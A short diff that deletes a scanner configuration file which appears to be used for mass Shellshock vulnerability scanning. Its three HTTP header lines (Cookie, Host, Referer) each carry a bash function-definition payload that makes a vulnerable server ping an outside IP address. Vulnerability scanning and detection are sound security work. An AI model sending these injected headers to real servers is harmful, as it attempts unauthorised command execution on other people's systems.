@@ -1,5 +1,0 @@
-banners = true
-http-user-agent = intrigue-shellshock-scan (http://blog.intrigue.io)
-http-header = Cookie:() { :; }; ping 72.14.190.138
-http-header = Host:() { :; }; ping 72.14.190.138
-http-header = Referer:() { :; }; ping 72.14.190.138
